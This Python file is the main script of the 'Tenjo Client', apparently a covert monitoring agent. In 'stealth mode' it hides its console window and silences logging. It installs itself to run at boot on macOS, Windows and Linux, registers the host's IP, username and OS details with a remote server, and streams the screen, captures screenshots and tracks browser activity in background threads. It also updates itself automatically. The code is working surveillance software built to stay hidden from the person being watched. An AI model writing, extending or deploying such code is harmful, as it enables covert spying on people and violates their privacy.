#!/usr/bin/env python3
# Tenjo Client - STEALTH MODE (NO HANG)

import sys
import os
import time
import logging
import signal
import threading
import subprocess
import platform

# Add src to path
sys.path.append('src')

from src.core.config import Config
from src.utils.api_client import APIClient
from src.utils.auto_update import check_and_update_if_needed
from src.modules.stream_handler import StreamHandler
from src.modules.browser_tracker import BrowserTracker
from src.modules.screen_capture import ScreenCapture
from os_detector import get_os_info_for_client

# Global flag for graceful shutdown
shutdown_flag = False

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_flag
    shutdown_flag = True

def setup_stealth_logging():
    """Setup logging for stealth mode - minimal output"""
    if Config.STEALTH_MODE:
        # In stealth mode, log to file only with minimal level
        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')
        logging.basicConfig(
            level=logging.WARNING,  # Only warnings and errors
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, mode='a'),
                # No console handler in stealth mode
            ]
        )
    else:
        # Development mode - normal logging
        logging.basicConfig(
            level=getattr(logging, Config.LOG_LEVEL),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

def hide_console_window():
    """Hide console window on Windows"""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def install_autostart():
    """Install client to start automatically on system boot"""
    try:
        current_file = os.path.abspath(__file__)

        if platform.system() == "Darwin":  # macOS
            # Create LaunchAgent plist
            plist_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(plist_dir, exist_ok=True)

            plist_file = os.path.join(plist_dir, "com.tenjo.client.plist")
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.tenjo.client</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_file}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""

            with open(plist_file, 'w') as f:
                f.write(plist_content)

            # Load the service
            subprocess.run(['launchctl', 'load', plist_file], capture_output=True)
            return True

        elif platform.system() == "Windows":  # Windows
            # Add to Windows startup registry
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "TenjoClient", 0, winreg.REG_SZ, f'python "{current_file}"')
            winreg.CloseKey(key)
            return True

        elif platform.system() == "Linux":  # Linux
            # Create systemd user service
            service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(service_dir, exist_ok=True)

            service_file = os.path.join(service_dir, "tenjo-client.service")
            service_content = f"""[Unit]
Description=Tenjo Client
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {current_file}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target"""

            with open(service_file, 'w') as f:
                f.write(service_content)

            # Enable and start service
            subprocess.run(['systemctl', '--user', 'enable', 'tenjo-client.service'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'start', 'tenjo-client.service'], capture_output=True)
            return True

    except Exception as e:
        logging.error(f"Failed to install autostart: {e}")
        return False

class StealthClient:
    def __init__(self):
        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
        self.stream_handler = StreamHandler(self.api_client)

        # Setup stealth logging
        setup_stealth_logging()
        self.logger = logging.getLogger('StealthClient')

        # Initialize browser tracker
        self.browser_tracker = BrowserTracker(self.api_client, self.logger)
        
        # Initialize screen capture with browser tracker integration
        self.screen_capture = ScreenCapture(self.api_client)
        self.screen_capture.set_browser_tracker(self.browser_tracker)

        # Hide console in stealth mode
        if Config.STEALTH_MODE:
            hide_console_window()

    def register_client(self):
        """Register client with server (silent)"""
        try:
            # Get OS info using the new detector
            os_info = get_os_info_for_client()
            
            client_info = {
                'client_id': Config.CLIENT_ID,
                'hostname': Config.HOSTNAME,
                'platform': Config.PLATFORM,
                'version': '1.0.0',
                'capabilities': ['streaming', 'monitoring'],
                'ip_address': Config.IP_ADDRESS,  # Use real IP address
                'username': Config.CLIENT_USER,
                'os_info': os_info,
                'timezone': 'Asia/Jakarta'
            }

            response = self.api_client.post('/api/clients/register', client_info)
            return True
        except Exception as e:
            # Silent fail in stealth mode
            if not Config.STEALTH_MODE:
                self.logger.error(f"Registration failed: {e}")
            return False

    def send_heartbeat(self):
        """Send heartbeat to server (silent)"""
        try:
            heartbeat_data = {
                'client_id': Config.CLIENT_ID,
                'timestamp': time.time(),
                'status': 'active'
            }

            response = self.api_client.post('/api/clients/heartbeat', heartbeat_data)
            return True
        except Exception as e:
            # Silent fail in stealth mode
            return False

    def run(self):
        """Main execution loop - STEALTH MODE"""
        global shutdown_flag

        if not Config.STEALTH_MODE:
            self.logger.info("=== STEALTH TENJO CLIENT STARTING ===")

        # Install autostart on first run
        if not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
            if install_autostart():
                # Mark as installed
                with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
                    f.write(str(time.time()))

        # Register with server (optional)
        self.register_client()

        # Start stream handler in separate thread
        stream_thread = None
        try:
            stream_thread = threading.Thread(
                target=self.stream_handler.start_streaming,
                daemon=True,
                name="StreamHandler"
            )
            stream_thread.start()
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start stream handler: {e}")

        # Start browser tracker in separate thread
        browser_thread = None
        try:
            self.browser_tracker.start_tracking()
            if not Config.STEALTH_MODE:
                self.logger.info("Browser tracker started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start browser tracker: {e}")

        # Start conditional screen capture in separate thread
        screen_capture_thread = None
        try:
            screen_capture_thread = threading.Thread(
                target=self.screen_capture.start_capture,
                daemon=True,
                name="ScreenCapture"
            )
            screen_capture_thread.start()
            if not Config.STEALTH_MODE:
                self.logger.info("Conditional screen capture started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start screen capture: {e}")

        # Stealth main loop - minimal logging
        heartbeat_counter = 0
        while not shutdown_flag:
            try:
                heartbeat_counter += 1

                # Send heartbeat every 5 minutes (300 seconds / 5 = 60 cycles)
                if heartbeat_counter % 60 == 0:
                    self.send_heartbeat()

                # Log status only in debug mode
                if heartbeat_counter % 720 == 0 and not Config.STEALTH_MODE:  # Every hour
                    self.logger.info(f"Stealth client running - {heartbeat_counter} cycles completed")

                time.sleep(5)  # 5 second intervals

            except KeyboardInterrupt:
                if not Config.STEALTH_MODE:
                    self.logger.info("Received keyboard interrupt")
                break
            except Exception as e:
                if not Config.STEALTH_MODE:
                    self.logger.error(f"Main loop error: {e}")
                time.sleep(10)

        if not Config.STEALTH_MODE:
            self.logger.info("Stealth client shutting down...")

def main():
    """Entry point"""
    # Check for updates first (will restart if update available)
    try:
        if check_and_update_if_needed(Config):
            # Update was performed, client will restart
            return
    except Exception as e:
        # Update failed, continue with current version
        if not Config.STEALTH_MODE:
            print(f"Update check failed: {e}")
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Create and run stealth client
    client = StealthClient()
    client.run()

if __name__ == "__main__":
    main()
